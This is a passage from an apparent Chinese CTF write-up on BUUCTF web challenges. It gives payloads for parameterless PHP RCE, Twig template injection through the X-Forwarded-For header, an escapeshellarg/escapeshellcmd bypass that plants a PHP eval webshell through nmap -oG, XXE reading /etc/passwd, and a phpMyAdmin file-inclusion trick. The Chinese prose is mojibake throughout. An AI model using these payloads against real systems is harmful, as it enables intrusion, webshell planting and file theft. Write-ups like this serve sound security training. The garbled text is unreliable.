¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)));<br></code></pre></td></tr></table></figure><p><img src="/images/Q18QQU2TN4NTI9VNSA0.png"><br><strong>ä»£ç è§£é‡Šï¼š</strong><br>æƒ³è¦æµè§ˆç›®å½•å†…çš„æ‰€æœ‰æ–‡ä»¶éœ€è¦ç”¨åˆ°å‡½æ•°<code>scandir()</code>ã€‚å½“<code>scandir()</code>ä¼ å…¥<code>.</code>,å®ƒå°±å¯ä»¥åˆ—å‡ºå½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ã€‚<br>ä½†è¿™é‡Œæ˜¯æ— å‚æ•°çš„RCEï¼Œæˆ‘ä»¬ä¸èƒ½å†™<code>scandir(.)</code>,è€Œ<code>localeconv()</code>å´ä¼šæœ‰ä¸€ä¸ªè¿”å›å€¼ï¼Œé‚£ä¸ªè¿”å›å€¼æ­£å¥½å°±æ˜¯<code>.</code>,å†é…åˆ<code>pos</code>æˆ–<code>current()</code>å°±å¯ä»¥æŠŠ<code>.</code>å–å‡ºæ¥ä¼ ç»™<code>scandir()</code>æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶äº†ã€‚</p><p>ç°åœ¨çŸ¥é“äº†flagçš„ä½ç½®ï¼Œflagä¸ºå€’æ•°ç¬¬äºŒä¸ªï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¿»è½¬å‡½æ•°<code>array_reverse()</code>ï¼Œå†ç”¨ä¸€ä¸ªnextå°±å¯ä»¥æŸ¥çœ‹flagæ–‡ä»¶äº†ï¼ŒæŸ¥çœ‹flagæ–‡ä»¶å¯ç”¨å‡½æ•°ä¸º<code>highlight_file(),readfile(),show_source()</code>ç­‰ç­‰ã€‚ã€‚ã€‚<br>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">exp</span>=readfile(<span class="hljs-keyword">next</span>(array_reverse(scandir(<span class="hljs-keyword">pos</span>(localeconv())))));<br><span class="hljs-regexp">//</span>$flag = <span class="hljs-string">&quot;flag&#123;c4305172-c8af-4fa8-af1f-504d83d83583&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>è™½ç„¶æœ¬é¢˜çš„flagä½ç½®ä¸æ˜¯é‚£ä¹ˆç‰¹æ®Šï¼Œä½†æ€»ä¼šé‡åˆ°ç‰¹æ®Šä½ç½®flagçš„é¢˜ï¼Œå¯ä»¥ç”¨<code>array_rand()</code>å’Œ<code>array_flip()</code><br>(<code>array_rand()</code>è¿”å›çš„æ˜¯é”®åæ‰€ä»¥å¿…é¡»æ­é…<code>array_flip()</code>æ¥äº¤æ¢é”®åã€é”®å€¼æ¥è·å¾—é”®å€¼ï¼Œéšæœºåˆ·æ–°æ˜¾ç¤ºçš„å†…å®¹)<br>payload:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=show<span class="hljs-constructor">_source(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒï¼šsession_id()</strong><br>ä¸Šé¢çš„æ­£åˆ™è¿‡æ»¤ä¸­å¹¶æ²¡æœ‰è¿‡æ»¤sessionï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨session_idæ¥è·å–flag<br><code>session_id()</code><br>å¯ä»¥ç”¨æ¥è·å–&#x2F;è®¾ç½®å½“å‰ä¼šè¯idã€‚<br>phpæ˜¯é»˜è®¤ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„<br>åœ¨æˆ‘ä»¬ä½¿ç”¨session_id()çš„æ—¶å€™ éœ€è¦ä½¿ç”¨<code>session_start()</code>æ¥å¼€å¯sessionä¼šè¯<br>PHPSESSIDæœ¬èº«æ˜¯å¯ä»¥ç›´æ¥åŠ ä¸Šä¾‹å¦‚flag.phpè¿™ç±»çš„å­—ç¬¦çš„<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">exp</span>=show_source(session_id(session_start()));<br>COOKIE:<br><span class="hljs-attribute">PHPSESSID</span>=flag.php<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">æ— å‚RCEä¼ é€é—¨</a><br>å†™çš„éå¸¸å¥½ï¼Œæ”¶è·é¢‡ä¸°ğŸ¤¤</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>å¯åŠ¨ç¯å¢ƒ<br>flag.txt<br><img src="/images/RDZVO40JRJ84SIYW.png"><br>hint.phpä¸­æŸ¥çœ‹æºç çš„æ³¨é‡Šä½œè€…ä¹Ÿè¯´äº†Do you know why i know your ip?<br>ç»“åˆé¢˜ç›®ä¸ä½œè€…çš„hintï¼ŒçŒœæµ‹æœ¬é¢˜x-forwarded-forå¤„æœ‰é—®é¢˜<br>burpsuiteæŠ“æŠ“<br><img src="/images/5ENMQE2LCM1KOF03JQ8.png"><br>æˆåŠŸæ‰§è¡Œï¼Œè¯´æ˜XFFå¯æ§<br>æ§åˆ¶XFFè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼ˆè¿™æ˜¯è¦åœ¨å‰ç«¯æœ‰IPç›¸å…³å›æ˜¾çš„æƒ…å†µï¼‰<br>æŸ¥é˜…èµ„æ–™<br>Flaskå¯èƒ½å­˜åœ¨Jinjia2æ¨¡ç‰ˆæ³¨å…¥æ¼æ´<br>PHPå¯èƒ½å­˜åœ¨Twigæ¨¡ç‰ˆæ³¨å…¥æ¼æ´<br>è¯•è¯•èƒ½å¦æ‰§è¡Œæ¨¡æ¿ç®—å¼</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/LJ7EPLUC0WFRYGH.png"><br>æˆåŠŸæ‰§è¡Œï¼Œå°è¯•æ˜¯å¦èƒ½æ‰§è¡Œå‘½ä»¤</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/12M2VGZKUFL40.png"><br>æ— è„‘RCE<br><a href="https://www.cnblogs.com/zzjdbk/p/13049923.html">æ¨¡æ¿æ³¨å…¥æ£€æµ‹</a></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//åˆ›å»ºç›®å½•</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//æ”¹å˜å½“å‰çš„ç›®å½•</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>HTTP_X_FORWARDED_FOR HTTPæ‰©å±•å¤´éƒ¨ï¼Œç”¨æ¥è¡¨ç¤ºhttpè¯·æ±‚ç«¯çœŸå®ip</p><p>REMOTE_ADDRä»£è¡¨å®¢æˆ·ç«¯çš„IPï¼Œä½†å®ƒçš„å€¼ä¸æ˜¯ç”±å®¢æˆ·ç«¯æä¾›çš„ï¼Œè€Œæ˜¯æœåŠ¡ç«¯æ ¹æ®å®¢æˆ·ç«¯çš„ipæŒ‡å®šçš„ï¼Œå½“ä½ çš„æµè§ˆå™¨è®¿é—®æŸä¸ªç½‘ç«™æ—¶ï¼Œå‡è®¾ä¸­é—´æ²¡æœ‰ä»»ä½•ä»£ç†ï¼Œé‚£ä¹ˆç½‘ç«™çš„webæœåŠ¡å™¨ï¼ˆNginxï¼ŒApacheç­‰ï¼‰å°±ä¼šæŠŠremote_addrè®¾ä¸ºä½ çš„æœºå™¨IPï¼Œå¦‚æœä½ ç”¨äº†æŸä¸ªä»£ç†ï¼Œé‚£ä¹ˆä½ çš„æµè§ˆå™¨ä¼šå…ˆè®¿é—®è¿™ä¸ªä»£ç†ï¼Œç„¶åå†ç”±è¿™ä¸ªä»£ç†è½¬å‘åˆ°ç½‘ç«™ï¼Œè¿™æ ·webæœåŠ¡å™¨å°±ä¼šæŠŠremote_addrè®¾ä¸ºè¿™å°ä»£ç†æœºå™¨çš„IPã€‚</p><p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿçš„æ˜¯escapeshellargå’Œescapeshellcmdè¿™ä¸¤ä¸ªå‡½æ•°</p><ul><li>escapeshellargï¼šå¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²ç”¨ä¸€å¯¹å•å¼•å·åŒ…å›´ï¼Œå°†å†…å®¹çš„â€™å…ˆç”¨åæ–œæ è½¬ä¹‰ï¼Œå†æ·»åŠ ä¸€å¯¹å•å¼•å·åŒ…å›´ï¼Œå³å•å¼•å·ä¼šè¢«è½¬ä¹‰ä¸ºâ€™&#39;â€˜</li><li>escapeshellcmdï¼šå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œè½¬ä¹‰</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ä¼ å…¥çš„å‚æ•°æ˜¯172.17.0.2<span class="hljs-string">&#x27; -v -d a=1</span><br><span class="hljs-string">ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†&#x27;</span>172.17.0.2<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -v -d a=1&#x27;</span>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚<br>ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ<span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼š<br>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl <span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„&#x27;æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„&#x27;é…å¯¹æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d <span class="hljs-attribute">a</span>=1&#x27;,å³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOSTæ•°æ®ä¸ºa=1&#x27;ã€‚<br></code></pre></td></tr></table></figure><p>ä¸¤æ¬¡è½¬ä¹‰åå‡ºç°äº†é—®é¢˜ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°å•å¼•å·çš„é—®é¢˜<br>å†å¾€ä¸‹çœ‹ï¼Œçœ‹åˆ°echo system(â€œnmap -T5 -sT -Pn â€“host-timeout 2 -F â€œ.$host);<br>è¿™é‡Œæœ‰ä¸ªsystemæ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”æœ‰ä¼ å‚ï¼Œè‚¯å®šæ˜¯åˆ©ç”¨è¿™é‡Œäº†</p><p>è¿™é‡Œä»£ç çš„æœ¬æ„æ˜¯å¸Œæœ›æˆ‘ä»¬è¾“å…¥ipè¿™æ ·çš„å‚æ•°åšä¸€ä¸ªæ‰«æï¼Œé€šè¿‡ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°æ¥è¿›è¡Œè§„åˆ™è¿‡æ»¤è½¬ä¹‰ï¼Œæˆ‘ä»¬çš„è¾“å…¥ä¼šè¢«å•å¼•å·å¼•èµ·æ¥ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬çœ‹åˆ°äº†ä¸Šé¢çš„æ¼æ´æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€ƒè„±è¿™ä¸ªå¼•å·çš„æŸç¼š</p><p>åœ¨nmapå‘½ä»¤ä¸­ï¼Œæœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥å¯æ§ï¼Œç„¶åå†™å…¥åˆ°æ–‡ä»¶ï¼Œä¼ å…¥ä¸€å¥è¯æœ¨é©¬<br>æ³¨æ„å¼•å·åŠ ç©ºæ ¼ï¼Œä¸åŠ ç©ºæ ¼ä¼šå°†è¯­å¥è½¬ä¹‰ã€‚</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php &#x27;</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥MD5ç›®å½•ä¸‹çš„1.php<br><img src="/images/S3IOWE9SGW1BLCJK5.png"><br>å¼€å§‹RCE</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">POST:<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ä¸ªå°é—®é¢˜</p><p>é¦–å…ˆæ˜¯åé¢æ²¡æœ‰åŠ å¼•å·</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php</span><br></code></pre></td></tr></table></figure><p>å…ˆç»è¿‡escapeshellarg()å‡½æ•°å¤„ç†ï¼Œè¯¥å‡½æ•°ä¼šå…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?host=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>å†ç»è¿‡escapeshellcmd()å‡½æ•°å¤„ç†ï¼Œescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼Œè½¬ä¹‰å‘½ä»¤ä¸­çš„æ‰€æœ‰shellå…ƒå­—ç¬¦æ¥å®Œæˆå·¥ä½œã€‚è¿™äº›å…ƒå­—ç¬¦åŒ…æ‹¬ï¼š<code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\\ã€‚</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?h</span>ost=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php\<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿”å›ç»“æœæ˜¯ä¸Šé¢é‚£æ ·æ–‡ä»¶ååé¢ä¼šå¤šä¸€ä¸ªå¼•å·1.phpâ€™</p><p>ç¬¬äºŒä¸ªæ˜¯åŠ å¼•å·ä½†å¼•å·å‰æ²¡æœ‰ç©ºæ ¼</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ååé¢å°±ä¼šå¤šå‡º<code>\\</code> <code>1.php\\</code><br><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>å…ˆå°è¯•sqlæ³¨å…¥ï¼Œè¡Œä¸é€š<br>çœ‹çœ‹æºç <br><img src="/images/VSCRU5OH75NYS3N.png"><br>æ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶<br>è¿˜æœ‰<br><code>contentType: &quot;application/xml;charset=utf-8&quot;,</code><br>è¿›å…¥doLogin.php<br><img src="/images/NY0S07MJ2GOIRTM3AJF.png"><br>å‘ç°éƒ½æŒ‡å‘xml<br>é‚£ä¹ˆxmlæœ‰ä¸ªxxeæ¼æ´ï¼ŒæŠ“åŒ…çœ‹èƒ½å¦åˆ©ç”¨ä¸€ä¸‹ï¼Œæ„å»ºä¸€ä¸ªæ¶æ„çš„å¤–éƒ¨å®ä½“<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/CK8BJG03EQERY8O69T0.png"><br>å¯è¡Œï¼Œçœ‹èƒ½ä¸èƒ½ç›´æ¥è¯»å–flag<br>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/MLC6SAFLMOJVT39WPR.png"><br>ä¼ é€é—¨&#x3D;&#x3D;&#x3D;&gt;<a href="https://www.freebuf.com/vuls/175451.html">æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´</a></p><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p><img src="/images/JMFRP9VYT5A0VKQDORT.png"><br>æ•´äº†ä¸ªè¿™ä¹ˆä¸ªç•Œé¢ï¼Œæœ‰ç‚¹è¿·ç³Šï¼ŒæŠ“åŒ…æºç éƒ½æ²¡è·å¾—æœ‰æ•ˆçš„ä¿¡æ¯<br>ç”¨dirsearchæ‰«æ‰«ï¼Œæ‰«åˆ°äº†robots.txtï¼Œé‡Œé¢æç¤ºäº†ä¸ªphpinfo.phpï¼Œè¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„ä¿¡æ¯<br>å†å¾€åç»§ç»­æ‰«åˆ°äº†phpmyadminï¼Œè¿›å…¥æŸ¥çœ‹ï¼Œæ•°æ®åº“é‡Œä¸€å¤§å †å†…å®¹æ ¹æœ¬æ‡’å¾—çœ‹<br><img src="/images/XXQ3LARFHLVNSZQEEQW.png"><br>æŸ¥é˜…åˆ°4.8.0 &lt;&#x3D; phpMyAdmin &lt; 4.8.2ç‰ˆæœ¬çš„phpmyadminéƒ½æ˜¯æœ‰æ–‡ä»¶åŒ…å«æ¼æ´<br><a href="https://blog.csdn.net/weixin_44037296/article/details/111039461">æ¼æ´å¤ç°</a><br>ä¾‹å¦‚ä¼ å…¥</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">target</span><span class="hljs-operator">=</span>db_datadict.php<span class="hljs-variable">%253</span>f<br></code></pre></td></tr></table></figure><p>ç”±äºæœåŠ¡å™¨ä¼šè‡ªåŠ¨è§£ç ä¸€æ¬¡ï¼Œæ‰€ä»¥åœ¨checkPageValidity()ä¸­ï¼Œ$pageçš„å€¼ä¸€å¼€å§‹ä¼šæ˜¯db_datadict.php%3f,åˆä¸€æ¬¡urlè§£ç åå˜æˆäº†db_datadict.php?,è¿™ä¾¿ç¬¦åˆäº†?å‰å†…å®¹åœ¨ç™½åå•çš„è¦æ±‚ï¼Œå‡½æ•°è¿”å›trueä½†åœ¨index.phpä¸­$_REQUEST[â€˜targetâ€™]ä»ç„¶æ˜¯db_datadict.php%3f,è€Œä¸”ä¼šè¢«includeï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šï¼Œå°±å¯é€ æˆä»»æ„æ–‡ä»¶åŒ…å«</p><p>æ¼æ´åŸç†æ˜¯ï¼š<br>åˆ©ç”¨&#x2F;ä½¿db_datadict.php?æˆä¸ºä¸€ä¸ªä¸å­˜åœ¨ç›®å½•ï¼Œåˆ©ç”¨includeå‡½æ•°çš„ç›®å½•ä¸æ–­è·³è½¬å°è¯•å¾—åˆ°flagç›®å½•ã€‚</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">25</span></span>çš„urlç¼–ç ä¸º%<br><span class="hljs-tag">%<span class="hljs-selector-tag">3f</span></span>çš„urlç¼–ç ä¸º?<br><span class="hljs-tag">%<span class="hljs-selector-tag">253f</span></span>--&gt;?<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span 